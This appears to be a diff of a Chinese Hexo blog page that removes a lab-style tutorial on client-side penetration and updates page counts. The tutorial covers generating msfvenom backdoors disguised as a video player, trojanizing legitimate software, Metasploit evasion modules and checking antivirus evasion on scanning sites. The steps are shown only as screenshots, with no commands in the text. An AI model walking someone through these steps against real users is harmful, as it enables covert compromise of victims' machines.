-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">客户端渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-08-17 10:38:12 / 修改时间：10:38:54" itemprop="dateCreated datePublished" datetime="2021-08-17T10:38:12+08:00">2021-08-17</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h1><h2 id="一、客户端渗透原理"><a href="#一、客户端渗透原理" class="headerlink" title="一、客户端渗透原理"></a>一、客户端渗透原理</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201142972.png" alt="image-20210816201142972"></p>
-<h2 id="二、制作Windows恶意软件获取shell"><a href="#二、制作Windows恶意软件获取shell" class="headerlink" title="二、制作Windows恶意软件获取shell"></a>二、制作Windows恶意软件获取shell</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201337098.png" alt="image-20210816201337098"></p>
-<h3 id="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"><a href="#实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马" class="headerlink" title="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"></a>实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201528885.png" alt="image-20210816201528885"></p>
-<h3 id="2-1生成西瓜影音-exe后门程序"><a href="#2-1生成西瓜影音-exe后门程序" class="headerlink" title="2.1生成西瓜影音.exe后门程序"></a>2.1生成西瓜影音.exe后门程序</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201708965.png" alt="image-20210816201708965"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201745558.png" alt="image-20210816201745558"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201820472.png" alt="image-20210816201820472"></p>
-<p>环境：kali、win7（靶机）</p>
-<h4 id="步骤1：生成后门程序并启动服务器"><a href="#步骤1：生成后门程序并启动服务器" class="headerlink" title="步骤1：生成后门程序并启动服务器"></a>步骤1：生成后门程序并启动服务器</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201959791.png" alt="image-20210816201959791"></p>
-<h4 id="步骤2：在MSF上启动handler开始监听后门程序"><a href="#步骤2：在MSF上启动handler开始监听后门程序" class="headerlink" title="步骤2：在MSF上启动handler开始监听后门程序"></a>步骤2：在MSF上启动handler开始监听后门程序</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203201351.png" alt="image-20210816203201351"></p>
-<p>启动msf</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203308925.png" alt="image-20210816203308925"></p>
-<p>加载hander模块</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203337202.png" alt="image-20210816203337202"></p>
-<p>配置payload</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203450238.png" alt="image-20210816203450238"></p>
-<p>查看并配置参数、启动</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203609271.png" alt="image-20210816203609271"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203656900.png" alt="image-20210816203656900"></p>
-<p>补充：启动后就在监听了</p>
-<h4 id="步骤3：win7下载木马文件并运行"><a href="#步骤3：win7下载木马文件并运行" class="headerlink" title="步骤3：win7下载木马文件并运行"></a>步骤3：win7下载木马文件并运行</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202231441.png" alt="image-20210816202231441"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202251261.png" alt="image-20210816202251261"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203759663.png" alt="image-20210816203759663"></p>
-<h4 id="步骤4：查看结果并提升权限"><a href="#步骤4：查看结果并提升权限" class="headerlink" title="步骤4：查看结果并提升权限"></a>步骤4：查看结果并提升权限</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203911048.png" alt="image-20210816203911048"></h4><p>查看权限</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204025799.png" alt="image-20210816204025799"></p>
-<p>提升权限</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204236941.png" alt="image-20210816204236941"></p>
-<p>其他操作</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204419164.png" alt="image-20210816204419164"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204435891.png" alt="image-20210816204435891"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204609219.png" alt="image-20210816204609219"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204637881.png" alt="image-20210816204637881"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204731011.png" alt="image-20210816204731011"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204847203.png" alt="image-20210816204847203"></p>
-<p>补充：软件病毒/木马等扫描网站</p>
-<p>1.可以把程序/软件会被那些杀毒软件扫描出来</p>
-<p>2.可以检测自己制作的木马可以避开率</p>
-<p>扫描网站1：<a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202542969.png" alt="image-20210816202542969"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202732647.png" alt="image-20210816202732647"></p>
-<p>扫描网站2：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202846223.png" alt="image-20210816202846223"></p>
-<h3 id="2-2模拟黑客给真正的软件加上后门"><a href="#2-2模拟黑客给真正的软件加上后门" class="headerlink" title="2.2模拟黑客给真正的软件加上后门"></a>2.2模拟黑客给真正的软件加上后门</h3><h4 id="步骤1：下载正版软件并安装上后门"><a href="#步骤1：下载正版软件并安装上后门" class="headerlink" title="步骤1：下载正版软件并安装上后门"></a>步骤1：下载正版软件并安装上后门</h4><p>下载程序</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205146217.png" alt="image-20210816205146217"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205214862.png" alt="image-20210816205214862"></p>
-<p>查找要安装后门的程序（副程序：主程序启动会带动其启动）</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205633896.png" alt="image-20210816205633896"></p>
-<h4 id="步骤2：把副程序复制到kali进行安装后门"><a href="#步骤2：把副程序复制到kali进行安装后门" class="headerlink" title="步骤2：把副程序复制到kali进行安装后门"></a>步骤2：把副程序复制到kali进行安装后门</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205914655.png" alt="image-20210816205914655"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205939315.png" alt="image-20210816205939315"></p>
-<p>安装后门</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210009776.png" alt="image-20210816210009776"></p>
-<p>win7下载安装了后门的程序并替换正版的程序</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210157882.png" alt="image-20210816210157882"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210214266.png" alt="image-20210816210214266"></p>
-<p>步骤3：启动</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210303111.png" alt="image-20210816210303111"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210315008.png" alt="image-20210816210315008"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210349331.png" alt="image-20210816210349331"></p>
-<p>回到win7启动软件</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210438619.png" alt="image-20210816210438619"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210512609.png" alt="image-20210816210512609"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210616482.png" alt="image-20210816210616482"></p>
-<h3 id="2-3-使用metasploit的evasion模块生成后门木马"><a href="#2-3-使用metasploit的evasion模块生成后门木马" class="headerlink" title="2.3 使用metasploit的evasion模块生成后门木马"></a>2.3 使用metasploit的evasion模块生成后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210719911.png" alt="image-20210816210719911"></p>
-<h4 id="步骤1：查找并加载模块"><a href="#步骤1：查找并加载模块" class="headerlink" title="步骤1：查找并加载模块"></a>步骤1：查找并加载模块</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210803467.png" alt="image-20210816210803467"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210832486.png" alt="image-20210816210832486"></p>
-<h4 id="步骤2：修改木马文件名称（可以不修改）"><a href="#步骤2：修改木马文件名称（可以不修改）" class="headerlink" title="步骤2：修改木马文件名称（可以不修改）"></a>步骤2：修改木马文件名称（可以不修改）</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210936108.png" alt="image-20210816210936108"></p>
-<h4 id="步骤3：设置payload"><a href="#步骤3：设置payload" class="headerlink" title="步骤3：设置payload"></a>步骤3：设置payload</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211013243.png" alt="image-20210816211013243"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211051718.png" alt="image-20210816211051718"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211129141.png" alt="image-20210816211129141"></p>
-<p>启动生成文件</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211209466.png" alt="image-20210816211209466"></p>
-<p>补充：上传文件，方便win7下载（也可以直接复制）</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211330054.png" alt="image-20210816211330054"></p>
-<h4 id="步骤4：监听"><a href="#步骤4：监听" class="headerlink" title="步骤4：监听"></a>步骤4：监听</h4><p>渗透：加载模块、配置参数</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211521609.png" alt="image-20210816211521609"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211559689.png" alt="image-20210816211559689"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211611575.png" alt="image-20210816211611575"></p>
-<h4 id="步骤5：win7启动木马文件"><a href="#步骤5：win7启动木马文件" class="headerlink" title="步骤5：win7启动木马文件"></a>步骤5：win7启动木马文件</h4><p>下载文件</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211648937.png" alt="image-20210816211648937"></p>
-<p>启动木马文件</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211730407.png" alt="image-20210816211730407"></p>
-<p>kali查看结果</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211810550.png" alt="image-20210816211810550"></p>
-<h2 id="三、制作Linux恶意软件获取shell"><a href="#三、制作Linux恶意软件获取shell" class="headerlink" title="三、制作Linux恶意软件获取shell"></a>三、制作Linux恶意软件获取shell</h2><p><strong>步骤1：使用msfvenom生成linux可执行文件，再开启apache服务</strong></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102634654.png" alt="image-20210817102634654"></p>
-<p>补充：这里的恶意文件是放在根目录下的，所以linux下载直接是ip地址+</p>
-<p><strong>步骤2：linux系统下载恶意文件</strong></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102923861.png" alt="image-20210817102923861"></p>
-<p>此时文件是不可执行的，所以要提升权限</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103147429.png" alt="image-20210817103147429"></p>
-<p>步骤3：设置linux的payload并</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103256476.png" alt="image-20210817103256476"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103309884.png" alt="image-20210817103309884"></p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103341812.png" alt="image-20210817103341812"></p>
-<p>步骤4：linux启动程序</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103420606.png" alt="image-20210817103420606"></p>
-<p>步骤5：查看结果与操作</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103501914.png" alt="image-20210817103501914"></p>
-<p>查看当前目录</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103601631.png" alt="image-20210817103601631"></p>
-<p>查看身份权限</p>
-<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103644708.png" alt="image-20210817103644708"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2195,7 +2051,7 @@ int main()
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2208,7 +2064,7 @@ int main()
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
